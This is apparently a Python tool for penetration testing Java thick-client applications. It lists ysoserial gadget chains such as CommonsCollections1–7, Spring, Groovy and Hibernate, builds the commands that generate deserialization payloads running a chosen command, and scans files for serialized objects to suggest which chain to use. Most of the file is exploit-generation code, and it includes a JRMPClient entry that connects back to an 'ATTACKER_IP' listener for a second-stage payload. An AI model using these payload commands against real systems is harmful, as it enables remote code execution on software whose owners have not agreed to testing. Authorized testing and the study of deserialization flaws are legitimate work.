"""
Java Deserialization Payload Generator — ysoserial commands and manual payloads.

Many thick-client Java applications (Swing, JavaFX, Eclipse RCP) use
ObjectInputStream to deserialize imported files, IPC messages, or config data.

Usage:
    python -I java_deser.py --list
    python -I java_deser.py --gadget CommonsCollections1 --cmd "calc.exe"
    python -I java_deser.py --gadget all --cmd "calc.exe" --output payloads/
    python -I java_deser.py --detect target.bin
"""

import argparse
import base64
import os
import sys

GADGET_CHAINS = {
    "CommonsCollections1": {
        "lib": "commons-collections:3.1",
        "desc": "InvokerTransformer chain — most common",
        "cmd": 'java -jar ysoserial.jar CommonsCollections1 "{cmd}"',
    },
    "CommonsCollections2": {
        "lib": "commons-collections4:4.0",
        "desc": "Javassist + PriorityQueue",
        "cmd": 'java -jar ysoserial.jar CommonsCollections2 "{cmd}"',
    },
    "CommonsCollections3": {
        "lib": "commons-collections:3.1",
        "desc": "TrAXFilter + InstantiateTransformer",
        "cmd": 'java -jar ysoserial.jar CommonsCollections3 "{cmd}"',
    },
    "CommonsCollections4": {
        "lib": "commons-collections4:4.0",
        "desc": "TreeBag + InstantiateTransformer",
        "cmd": 'java -jar ysoserial.jar CommonsCollections4 "{cmd}"',
    },
    "CommonsCollections5": {
        "lib": "commons-collections:3.1",
        "desc": "BadAttributeValueExpException",
        "cmd": 'java -jar ysoserial.jar CommonsCollections5 "{cmd}"',
    },
    "CommonsCollections6": {
        "lib": "commons-collections:3.1",
        "desc": "HashSet + TiedMapEntry — works on Java 8+",
        "cmd": 'java -jar ysoserial.jar CommonsCollections6 "{cmd}"',
    },
    "CommonsCollections7": {
        "lib": "commons-collections:3.1",
        "desc": "Hashtable + LazyMap",
        "cmd": 'java -jar ysoserial.jar CommonsCollections7 "{cmd}"',
    },
    "CommonsBeanutils1": {
        "lib": "commons-beanutils:1.9.2",
        "desc": "BeanComparator + TemplatesImpl",
        "cmd": 'java -jar ysoserial.jar CommonsBeanutils1 "{cmd}"',
    },
    "Spring1": {
        "lib": "spring-core:4.1.4, spring-beans:4.1.4",
        "desc": "MethodInvokeTypeProvider",
        "cmd": 'java -jar ysoserial.jar Spring1 "{cmd}"',
    },
    "Spring2": {
        "lib": "spring-core:4.1.4, spring-aop:4.1.4, aopalliance:1.0",
        "desc": "JdkDynamicAopProxy",
        "cmd": 'java -jar ysoserial.jar Spring2 "{cmd}"',
    },
    "Groovy1": {
        "lib": "groovy:2.3.9",
        "desc": "MethodClosure + ConvertedClosure",
        "cmd": 'java -jar ysoserial.jar Groovy1 "{cmd}"',
    },
    "Hibernate1": {
        "lib": "hibernate-core:4.3.11",
        "desc": "ComponentType + PojoComponentTuplizer",
        "cmd": 'java -jar ysoserial.jar Hibernate1 "{cmd}"',
    },
    "JBossInterceptors1": {
        "lib": "jboss-interceptor-core:2.0.0",
        "desc": "InterceptorMethodHandler",
        "cmd": 'java -jar ysoserial.jar JBossInterceptors1 "{cmd}"',
    },
    "Jdk7u21": {
        "lib": "JDK 7u21 only",
        "desc": "No third-party deps — AnnotationInvocationHandler",
        "cmd": 'java -jar ysoserial.jar Jdk7u21 "{cmd}"',
    },
    "URLDNS": {
        "lib": "JDK built-in",
        "desc": "DNS lookup only (no RCE) — for blind detection",
        "cmd": 'java -jar ysoserial.jar URLDNS "http://COLLABORATOR_URL"',
    },
    "JRMPClient": {
        "lib": "JDK built-in",
        "desc": "Connect back to JRMP listener for second-stage",
        "cmd": 'java -jar ysoserial.jar JRMPClient "ATTACKER_IP:1099"',
    },
}

# Java serialization magic bytes
JAVA_SERIAL_MAGIC = b"\xac\xed\x00\x05"
JAVA_SERIAL_BASE64_PREFIX = "rO0AB"

# Common indicator classes found in serialized streams
INDICATOR_CLASSES = [
    "org.apache.commons.collections",
    "org.apache.commons.beanutils",
    "org.springframework",
    "org.codehaus.groovy",
    "org.hibernate",
    "org.jboss",
    "com.sun.org.apache.xalan",
    "java.rmi.server",
    "javax.management",
    "com.mchange.v2.c3p0",
]


def list_gadgets():
    print(f"\n{'Gadget Chain':<25} {'Library':<45} Description")
    print("=" * 110)
    for name, info in sorted(GADGET_CHAINS.items()):
        print(f"{name:<25} {info['lib']:<45} {info['desc']}")

    print(f"\nTotal: {len(GADGET_CHAINS)} gadget chains")
    print("\nDownload ysoserial: https://github.com/frohoff/ysoserial/releases")
    print("JRMP listener: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'calc.exe'")


def generate_commands(gadget: str, cmd: str, output_dir: str = None):
    if gadget.lower() == "all":
        chains = GADGET_CHAINS
    elif gadget in GADGET_CHAINS:
        chains = {gadget: GADGET_CHAINS[gadget]}
    else:
        print(f"[-] Unknown gadget: {gadget}")
        print(f"[*] Available: {', '.join(sorted(GADGET_CHAINS.keys()))}")
        return

    if output_dir:
        os.makedirs(output_dir, exist_ok=True)

    for name, info in sorted(chains.items()):
        ysoserial_cmd = info["cmd"].format(cmd=cmd)

        if output_dir:
            out_file = os.path.join(output_dir, f"{name}.bin")
            full_cmd = f'{ysoserial_cmd} > "{out_file}"'
            print(f"[*] {name}: {full_cmd}")
        else:
            print(f"\n--- {name} ---")
            print(f"Library: {info['lib']}")
            print(f"Command: {ysoserial_cmd}")

            if name == "URLDNS":
                print("Note: DNS only — use for blind detection, not RCE")
            elif name == "JRMPClient":
                print(f"Listener: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 '{cmd}'")

    if output_dir:
        print(f"\n[+] Run the commands above to generate {len(chains)} payload files in {output_dir}/")
        print("[*] Batch generate: for /L %i in (1,1,1) do (java -jar ysoserial.jar ... > file.bin)")


def detect_serialization(filepath: str):
    print(f"\n[*] Analyzing: {filepath}")

    with open(filepath, "rb") as f:
        data = f.read()

    # Check raw Java serialization
    if data[:4] == JAVA_SERIAL_MAGIC:
        print("[+] JAVA SERIALIZED OBJECT DETECTED (magic: AC ED 00 05)")
    elif data[:2] == b"\x1f\x8b":
        print("[?] GZIP compressed — may contain serialized object")
    else:
        # Check if base64 encoded
        try:
            text = data.decode("utf-8", errors="ignore")
            if JAVA_SERIAL_BASE64_PREFIX in text:
                print("[+] BASE64-ENCODED Java serialized object found")
        except Exception:
            pass

    # Search for known gadget class names
    text_content = data.decode("latin-1")
    found_classes = []
    for cls in INDICATOR_CLASSES:
        if cls in text_content:
            found_classes.append(cls)

    if found_classes:
        print("\n[+] Library indicators found in stream:")
        for cls in found_classes:
            print(f"    - {cls}")

        # Suggest gadget chains
        print("\n[*] Suggested gadget chains:")
        for name, info in GADGET_CHAINS.items():
            for cls in found_classes:
                lib_name = cls.split(".")[-1].lower()
                if lib_name in info["lib"].lower() or lib_name in name.lower():
                    print(f"    - {name} ({info['lib']})")
                    break
    else:
        print("[-] No known library indicators found")
        print("[*] Try URLDNS (no deps) or Jdk7u21 (JDK 7 only)")


def main():
    parser = argparse.ArgumentParser(description="Java deserialization payload generator")
    parser.add_argument("--list", action="store_true", help="List all gadget chains")
    parser.add_argument("--gadget", "-g", help="Gadget chain name or 'all'")
    parser.add_argument("--cmd", "-c", default="calc.exe", help="Command to execute")
    parser.add_argument("--output", "-o", help="Output directory for payload files")
    parser.add_argument("--detect", "-d", help="Detect serialization in a file")
    args = parser.parse_args()

    if args.list:
        list_gadgets()
    elif args.detect:
        detect_serialization(args.detect)
    elif args.gadget:
        generate_commands(args.gadget, args.cmd, args.output)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
